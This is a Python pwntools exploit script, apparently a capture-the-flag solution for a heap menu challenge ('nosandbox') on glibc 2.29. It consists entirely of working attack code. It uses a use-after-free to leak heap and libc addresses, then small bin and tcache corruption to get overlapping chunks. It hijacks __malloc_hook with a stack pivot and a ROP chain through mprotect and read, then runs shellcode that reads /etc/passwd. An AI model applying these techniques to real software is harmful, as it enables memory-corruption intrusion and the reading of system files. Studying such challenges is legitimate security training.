from pwn import *
from heaputils import *


def debut(idx, name):
	p.sendlineafter("> ", "1")
	p.sendlineafter("idx: ", str(idx))
	p.sendafter("hero name: ", name)

def retire(idx):
	p.sendlineafter("> ", "4")
	p.sendlineafter("idx: ", str(idx))

def rename(idx, name):
	p.sendlineafter("> ", "2")
	p.sendlineafter("idx: ", str(idx))
	p.sendafter("hero name: ", name)

def show(idx):
	p.sendlineafter("> ", "3")
	p.sendlineafter("idx: ", str(idx))
	p.recvuntil("hero name: ")
	return p.recvline().strip("\n")

def punch(data):
	p.sendlineafter("> ", "50056")
	p.send(data)
	p.recvuntil("Serious Punch!!!")

def debug():
	PIE = get_PIE(p,7)
	print hex(PIE)
	script = ""
	bp = [0x213F]
	for x in bp:
		script += "b *0x%x\n"%(PIE+x)
	gdb.attach(p,gdbscript=script)
	
if __name__ == "__main__":
	context.os = 'linux'
	context.arch = 'amd64'
	sc = '''
	lea rdi, [rip+flag]
	mov rsi, 0
	mov rax, 2
	syscall

	mov rdi, rax
	mov rsi, rsp
	mov rdx, 0x100
	mov rax, 0
	syscall

	mov rdi, 1
	mov rsi, rsp
	mov rdx, 0x100
	mov rax, 1
	syscall

	flag: .string "/etc/passwd"
	'''

	sc = asm(sc)
	libc = ELF("./libc.so.6")
	p = process(["./ld-2.29.so", "./nosandbox"], env={"LD_PRELOAD":"./libc.so.6"})
	#p = process("./nosandbox")	

	# phase.1 leak heap
	debut(0, "a"*0x80)
	retire(0)
	debut(0, "a"*0x80)
	retire(0)
	HEAP = u64(show(0).ljust(8,"\x00"))
	log.info("HEAP: 0x%x"%HEAP)

	# phase.2 leak libc
	for i in range(5):
		debut(0, "a"*0x80)
		retire(0)
	debut(0, "\xcc"*0x80)
	debut(1, "\xdd"*0x80) # prevent consolidation and store the fake chunk inside itself
	retire(0)
	
	LIBC = u64(show(0).ljust(8,"\x00")) + 0x7fdb5d847000 - 0x7fdb5da2bca0
	log.info("LIBC: 0x%x"%LIBC)

	# small bin attack (with UAF to 0) to make an overlapping chunks primitive
	debut(2, "\xee"*0x90)
	fakechunk = HEAP + 0x564c0870f740 - 0x564c0870f260
	victim = HEAP + 0x55618af1a640 - 0x55618af1a260
	tcache = (HEAP & 0xfffffffffffff000) + 0x40
	rename(0, p64(0)+p64(fakechunk))
	rename(1, "\xdd"*0x60+p64(0x0)+p64(0x91)+p64(victim)+p64(victim))
	debut(0, p64(fakechunk).ljust(0x80,"\x00"))
	debut(0, "\xaa"*0x80)
	
	# now 1 overlaps with 0, overflowing 1 will cause 0 to change

	# now prepare tcache to merge
	# set fd and bk
	rename(1, "\xdd"*0x60+p64(0)+p64(0x21)+p64(0))
	retire(0)

	rename(1, "\xdd"*0x60+p64(0)+p64(0x31)+p64(0))
	retire(0)
	
	context.log_level = 'debug'
	rename(2, "x"*0x60+p64(0x90)+p64(0x31)) # make size sane

	# set size to 0x701
	for i in range(7):
		debut(2, "a"*0x3a0)
		retire(2)
	
	debut(2, "a"*0x390)
	retire(2)

	# now merge
	
	rename(1, "\xdd"*0x60+p64(0x700)+p64(0x90)+p64(0xdeadbeef)*2) # set prev inuse to 0 and set size to an appropirate value
	rename(0, p64(tcache)*4) # adhere to FD->bk == victim and BK->fd == victim in unlink
	gdb.attach(p)
	retire(0)

	# now tcache is in unsorted bin. get it allcoated. now we have arbitrary read/write?
	debut(0, "a"*0x400)
	
	# consume 7 0x210 chunks
	for i in range(7):
		debut(1, "a"*0x210)
		retire(1)

	# do the punching
	malloc_hook = LIBC + libc.symbols['__malloc_hook']
	rename(0, p64(malloc_hook)*(0x400//8 - 1))

	stack_pivot = LIBC + 0x0000000000055ff4
	ret = LIBC + 0x000000000002535f
	pop_rdi = LIBC + 0x0000000000026542
	pop_rsi = LIBC + 0x0000000000026f9e
	pop_rdx = LIBC + 0x000000000012bda6
	mprotect = LIBC + libc.symbols['mprotect']
	read = LIBC + libc.symbols['read']

	punch(p64(stack_pivot))
	rop = p64(ret) * 4
	rop += p64(pop_rdi) + p64(LIBC)
	rop += p64(pop_rsi) + p64(0x1000)
	rop += p64(pop_rdx) + p64(7)
	rop += p64(mprotect)
	rop += p64(pop_rdi) + p64(0)
	rop += p64(pop_rsi) + p64(LIBC)
	rop += p64(pop_rdx) + p64(0x1000)
	rop += p64(read)
	rop += p64(LIBC)
	debut(0, rop)
	p.send(sc)
	p.interactive()
